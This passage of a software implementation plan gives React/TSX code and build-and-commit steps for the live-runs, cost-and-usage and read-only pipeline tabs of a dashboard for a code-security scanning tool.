                  <span className="font-mono truncate">{m.split("-").slice(-2).join("-")}</span>
                  <span className="text-white font-bold">{c}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
```

- [ ] **Step 5: Wire RunsPage into App.tsx**

Replace the `<Route path="/runs" ...>` placeholder with:

```tsx
import { RunsPage } from "./pages/runs/RunsPage";
// ...
<Route path="/runs" element={<RunsPage />} />
```

- [ ] **Step 6: Build and verify**

```bash
cd surfaces/dashboard && npm run build
```

Expected: no errors.

- [ ] **Step 7: Commit**

```bash
cd ../..
git add surfaces/dashboard/src/hooks/ surfaces/dashboard/src/pages/runs/
git commit -m "feat: Live Runs tab with SSE trace, budget gauge, model router log"
```

---

### Task 20: Cost & Usage tab

**Files:**
- Create: `surfaces/dashboard/src/pages/cost/CostPage.tsx`
- Modify: `surfaces/dashboard/src/App.tsx`

- [ ] **Step 1: Install recharts**

```bash
cd surfaces/dashboard && npm install recharts
```

- [ ] **Step 2: Create src/pages/cost/CostPage.tsx**

```tsx
// surfaces/dashboard/src/pages/cost/CostPage.tsx
import { useQuery } from "@tanstack/react-query";
import { api, CostEntryDTO } from "../../api/client";
import {
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, Cell,
} from "recharts";

const TIER_COLOR: Record<string, string> = {
  fast: "#6366f1", balanced: "#f59e0b", top: "#ef4444",
};

export function CostPage() {
  const { data: summary } = useQuery({ queryKey: ["cost-summary"], queryFn: api.getCostSummary });
  const { data: ledger } = useQuery({ queryKey: ["cost-ledger"], queryFn: api.getCostLedger });

  const tierTotals = (ledger ?? []).reduce<Record<string, number>>((acc, e) => {
    acc[e.tier] = (acc[e.tier] ?? 0) + e.cost_usd;
    return acc;
  }, {});

  const tierChartData = Object.entries(tierTotals).map(([tier, cost]) => ({ tier, cost }));

  return (
    <div className="flex flex-col gap-8">
      <h1 className="text-2xl font-bold">Cost & Usage</h1>

      {summary && (
        <div className="grid grid-cols-3 gap-4">
          <StatCard label="Total spend" value={`$${summary.total_cost_usd.toFixed(4)}`} />
          <StatCard label="Tokens in" value={summary.total_tokens_in.toLocaleString()} />
          <StatCard label="LLM calls" value={summary.total_calls.toLocaleString()} />
        </div>
      )}

      {tierChartData.length > 0 && (
        <div>
          <h2 className="text-lg font-semibold mb-4">Spend by tier</h2>
          <ResponsiveContainer width="100%" height={200}>
            <BarChart data={tierChartData}>
              <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
              <XAxis dataKey="tier" stroke="#9CA3AF" />
              <YAxis stroke="#9CA3AF" tickFormatter={(v) => `$${v.toFixed(3)}`} />
              <Tooltip
                contentStyle={{ background: "#1F2937", border: "none", borderRadius: 8 }}
                formatter={(v: number) => [`$${v.toFixed(4)}`, "cost"]}
              />
              <Bar dataKey="cost" radius={[4, 4, 0, 0]}>
                {tierChartData.map((entry) => (
                  <Cell key={entry.tier} fill={TIER_COLOR[entry.tier] ?? "#6B7280"} />
                ))}
              </Bar>
            </BarChart>
          </ResponsiveContainer>
        </div>
      )}

      <div>
        <h2 className="text-lg font-semibold mb-4">Ledger</h2>
        <div className="bg-gray-900 border border-gray-700 rounded-xl overflow-hidden">
          <div className="px-4 py-3 border-b border-gray-700 text-xs font-semibold text-gray-400 uppercase tracking-wide grid grid-cols-5 gap-4">
            <span>Scope</span><span>Model</span><span>Tier</span><span>Tokens in/out</span><span>Cost</span>
          </div>
          {(ledger ?? []).slice(0, 50).map((e) => (
            <div key={e.id} className="px-4 py-2.5 border-b border-gray-800 grid grid-cols-5 gap-4 text-sm">
              <span className="text-gray-400 truncate font-mono text-xs">{e.scope_type}</span>
              <span className="font-mono text-xs text-gray-300 truncate">{e.model_id.split("-").slice(-2).join("-")}</span>
              <span>
                <span className="px-2 py-0.5 rounded text-xs font-medium" style={{ background: TIER_COLOR[e.tier] + "33", color: TIER_COLOR[e.tier] }}>
                  {e.tier}
                </span>
              </span>
              <span className="font-mono text-xs text-gray-400">
                {e.tokens_in.toLocaleString()} / {e.tokens_out.toLocaleString()}
              </span>
              <span className="font-mono text-xs text-emerald-400">${e.cost_usd.toFixed(4)}</span>
            </div>
          ))}
          {(ledger ?? []).length === 0 && (
            <div className="px-4 py-8 text-center text-gray-600 text-sm">No cost entries yet.</div>
          )}
        </div>
      </div>
    </div>
  );
}

function StatCard({ label, value }: { label: string; value: string }) {
  return (
    <div className="bg-gray-900 border border-gray-700 rounded-xl p-5">
      <p className="text-xs text-gray-500 uppercase tracking-wide font-semibold mb-1">{label}</p>
      <p className="text-2xl font-bold font-mono">{value}</p>
    </div>
  );
}
```

- [ ] **Step 3: Wire into App.tsx**

```tsx
import { CostPage } from "./pages/cost/CostPage";
// ...
<Route path="/cost" element={<CostPage />} />
```

- [ ] **Step 4: Build and verify**

```bash
cd surfaces/dashboard && npm run build
```

Expected: no errors.

- [ ] **Step 5: Commit**

```bash
cd ../..
git add surfaces/dashboard/
git commit -m "feat: Cost & Usage tab with tier breakdown chart and ledger"
```

---

### Task 21: Pipeline read-only tab

**Files:**
- Create: `surfaces/dashboard/src/pages/pipeline/PipelinePage.tsx`
- Modify: `surfaces/dashboard/src/App.tsx`

- [ ] **Step 1: Install React Flow**

```bash
cd surfaces/dashboard && npm install @xyflow/react
```

- [ ] **Step 2: Create src/pages/pipeline/PipelinePage.tsx**

```tsx
// surfaces/dashboard/src/pages/pipeline/PipelinePage.tsx
import { useCallback } from "react";
import {
  ReactFlow, Background, Controls, MiniMap,
  Node, Edge, Handle, Position, NodeProps,
} from "@xyflow/react";
import "@xyflow/react/dist/style.css";

const TIER_COLOR: Record<string, string> = {
  fast: "#6366f1", balanced: "#f59e0b", top: "#ef4444", none: "#6B7280",
};

function AgentNode({ data }: NodeProps) {
  return (
    <div className="bg-gray-900 border border-gray-700 rounded-xl px-5 py-4 min-w-[160px] shadow-xl">
      <Handle type="target" position={Position.Left} className="!bg-gray-600" />
      <p className="text-sm font-bold text-white">{data.label as string}</p>
      <p className="text-xs text-gray-400 mt-1">{data.agent as string}</p>
      <span
        className="mt-2 inline-block px-2 py-0.5 rounded text-xs font-semibold"
        style={{ background: TIER_COLOR[(data.tier as string)] + "22", color: TIER_COLOR[(data.tier as string)] }}
      >
        {data.tier as string}
      </span>
      {(data.budget_pct as number) > 0 && (
        <p className="text-xs text-gray-600 mt-1">{data.budget_pct as number}% budget</p>
      )}
      <Handle type="source" position={Position.Right} className="!bg-gray-600" />
    </div>
  );
}

const nodeTypes = { agent: AgentNode };

// Full-scan default pipeline — mirrors config/pipeline_configs/full-scan.yaml
const INITIAL_NODES: Node[] = [
  { id: "ingestion", type: "agent", position: { x: 0, y: 100 },
    data: { label: "Ingestion", agent: "IngestionAgent", tier: "fast", budget_pct: 5 } },
  { id: "sast", type: "agent", position: { x: 220, y: 0 },
    data: { label: "SAST", agent: "SemgrepAdapter", tier: "none", budget_pct: 0 } },
  { id: "secrets", type: "agent", position: { x: 220, y: 200 },
    data: { label: "Secrets", agent: "TruffleHogAdapter", tier: "none", budget_pct: 0 } },
  { id: "triage", type: "agent", position: { x: 460, y: 100 },
    data: { label: "Triage", agent: "TriageAgent", tier: "balanced", budget_pct: 40 } },
  { id: "explainer", type: "agent", position: { x: 700, y: 100 },
    data: { label: "Explainer", agent: "ExplainerAgent", tier: "fast", budget_pct: 15 } },
];

const INITIAL_EDGES: Edge[] = [
  { id: "ing-sast", source: "ingestion", target: "sast", animated: false },
  { id: "ing-sec", source: "ingestion", target: "secrets", animated: false },
  { id: "sast-tri", source: "sast", target: "triage", animated: false },
  { id: "sec-tri", source: "secrets", target: "triage", animated: false },
  { id: "tri-exp", source: "triage", target: "explainer", animated: false },
];

export function PipelinePage() {
  return (
    <div className="flex flex-col gap-4 h-full">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Pipeline</h1>
        <span className="text-xs text-gray-500 bg-gray-800 px-3 py-1 rounded-full">
          Read-only in Phase 1 — editing arrives in Phase 2
        </span>
      </div>
      <p className="text-sm text-gray-400">Default pipeline: <span className="text-white font-medium">full-scan</span></p>
      <div className="flex-1 min-h-[500px] bg-gray-950 border border-gray-800 rounded-xl overflow-hidden">
        <ReactFlow
          nodes={INITIAL_NODES}
          edges={INITIAL_EDGES}
          nodeTypes={nodeTypes}
          fitView
          nodesDraggable={false}
          nodesConnectable={false}
          elementsSelectable={false}
          proOptions={{ hideAttribution: true }}
        >
          <Background color="#374151" gap={24} />
          <Controls showInteractive={false} />
          <MiniMap nodeColor={(n) => TIER_COLOR[(n.data?.tier as string) ?? "none"]} maskColor="#111827cc" />
        </ReactFlow>
      </div>
    </div>
  );
}
```

- [ ] **Step 3: Wire into App.tsx**

```tsx
import { PipelinePage } from "./pages/pipeline/PipelinePage";
// ...
<Route path="/pipeline" element={<PipelinePage />} />
```

- [ ] **Step 4: Build and verify**

```bash
cd surfaces/dashboard && npm run build
```

Expected: no errors.

- [ ] **Step 5: Commit**

```bash
cd ../..
git add surfaces/dashboard/
git commit -m "feat: Pipeline tab — read-only React Flow graph of default pipeline"
```

---

*Skills & dashboard plan complete. Continue with [2026-06-17-phase1-e2e.md] for Tasks 22–24 (docs, E2E test, evaluation harness).*
